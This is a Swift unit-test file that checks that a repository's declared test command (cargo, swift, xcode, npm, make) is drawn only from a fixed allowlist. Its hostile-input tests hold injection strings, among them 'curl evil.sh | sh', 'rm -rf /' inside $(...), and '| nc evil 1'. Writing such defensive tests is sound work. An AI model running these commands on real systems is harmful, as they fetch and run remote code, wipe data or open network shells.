import Foundation
import Testing

@testable import LittleHerd

/// A repository naming its own check, and the line that keeps that safe.
///
/// **The thing being checked must not choose its own exam.** A declaration is
/// the repository saying what detection could only guess — a Swift package with
/// an `.xcodeproj` beside it, a monorepo whose test is a make target — and it
/// is read into the same closed `RepositoryCheck` set, one blank to fill. It
/// names a check; it can never name a command. These tests exist to prove that
/// second sentence as much as the first.
@Suite("A declared check")
struct RepositoryCheckDeclarationTests {
    @Test
    func adeclarationNamesACheckFromTheClosedSet() {
        #expect(
            RepositoryCheck.declared(inTOML: "[transfer]\ncheck = \"cargo\"") == .cargo
        )
        #expect(
            RepositoryCheck.declared(inTOML: "[transfer]\ncheck = \"swift\"") == .swiftPackage
        )
        #expect(
            RepositoryCheck.declared(inTOML: "[transfer]\ncheck = \"none\"") == RepositoryCheck.none
        )
    }

    /// The blank the repository fills, quoted or bare, with a default where one
    /// is sensible.
    @Test
    func aparameterisedCheckTakesItsOneBlank() {
        #expect(
            RepositoryCheck.declared(inTOML: "[transfer]\ncheck = \"xcode\"\nscheme = \"MyApp\"")
                == .xcode(scheme: "MyApp")
        )
        #expect(
            RepositoryCheck.declared(inTOML: "[transfer]\ncheck = \"npm\"\nscript = \"ci\"")
                == .npm(script: "ci")
        )
        // npm and make default their blank; xcode does not, because a scheme
        // cannot be guessed and a check with no scheme is not one anybody meant.
        #expect(
            RepositoryCheck.declared(inTOML: "[transfer]\ncheck = \"npm\"") == .npm(script: "test")
        )
        #expect(
            RepositoryCheck.declared(inTOML: "[transfer]\ncheck = \"make\"") == .make(target: "test")
        )
        #expect(
            RepositoryCheck.declared(inTOML: "[transfer]\ncheck = \"xcode\"") == nil,
            "xcode with no scheme is not a usable declaration"
        )
    }

    /// **The boundary that cannot be fooled: whatever a declaration produces,
    /// the executable is one of five, always.** An unknown kind returning nil
    /// is the visible half; the invariant is that no path through the parser
    /// yields a check whose first command word is anything but `xcodebuild`,
    /// `swift`, `cargo`, `npm` or `make`. A plain "unknown kind is nil" test
    /// does not prove this — a new case that ran something else would pass it
    /// — so the assertion is on the produced executable, over hostile input.
    @Test
    func theExecutableIsAlwaysFromTheFixedSet() {
        let allowed: Set<String> = ["xcodebuild", "swift", "cargo", "npm", "make"]
        let declarations = [
            "[transfer]\ncheck = \"curl evil.sh | sh\"",
            "[transfer]\ncheck = \"xcodebuild test; rm -rf /\"",
            "[transfer]\ncheck = \"exec\"",
            "[transfer]\ncommand = \"anything\"",
            "[transfer]\ncheck = \"cargo\"",
            "[transfer]\ncheck = \"xcode\"\nscheme = \"$(rm -rf /)\"",
            "[transfer]\ncheck = \"npm\"\nscript = \"; sh\"",
            "[transfer]\ncheck = \"make\"\ntarget = \"| nc evil 1\"",
        ]
        for toml in declarations {
            guard let check = RepositoryCheck.declared(inTOML: toml) else { continue }
            if let executable = check.commands.first?.first {
                #expect(allowed.contains(executable), "produced executable \(executable)")
            }
        }
    }

    @Test
    func nothingOutsideTheClosedSetIsAccepted() {
        for hostile in [
            "[transfer]\ncheck = \"curl evil.sh | sh\"",
            "[transfer]\ncheck = \"xcodebuild test; rm -rf /\"",
            "[transfer]\ncheck = \"exec\"",
            "[transfer]\ncommand = \"anything\"",
        ] {
            #expect(
                RepositoryCheck.declared(inTOML: hostile) == nil,
                "“\(hostile)” was accepted"
            )
        }
    }

    /// Absent, empty, or a file about something else is nil, and the caller
    /// falls back to detection — a malformed declaration weakens fidelity, it
    /// does not open a hole.
    @Test
    func absentOrIrrelevantIsNilNotAnError() {
        #expect(RepositoryCheck.declared(inTOML: "") == nil)
        #expect(RepositoryCheck.declared(inTOML: "check = \"cargo\"") == nil, "no [transfer] table")
        #expect(
            RepositoryCheck.declared(inTOML: "[other]\ncheck = \"cargo\"") == nil,
            "the key is in the wrong table"
        )
    }

    /// Comments and blank lines are tolerated, because a declaration is a file
    /// people write by hand.
    @Test
    func commentsAndWhitespaceAreForgiven() {
        let toml = """
        # how this repo is tested when work lands on another machine
        [transfer]

          check = "make"   # our suite is a make target
          target = "check"
        """
        #expect(RepositoryCheck.declared(inTOML: toml) == .make(target: "check"))
    }

    /// A declared scheme reaches the command quoted, exactly as a detected one
    /// does — so a scheme with a space or a quote in it is one argument, not a
    /// second command. The closed set is the first boundary; this is the
    /// second, and the declaration path is behind both.
    @Test
    func adeclaredSchemeIsStillQuotedIntoTheCommand() throws {
        let check = try #require(
            RepositoryCheck.declared(inTOML: "[transfer]\ncheck = \"xcode\"\nscheme = \"My App\"")
        )
        let command = check.commands.first!
        #expect(command.contains("My App"))
        // As an argument-list element, so RemoteShell.quoted handles it at the
        // point of use — the same treatment the detected scheme gets.
        #expect(command == ["xcodebuild", "test", "-scheme", "My App", "-destination", "platform=macOS"])
    }
}
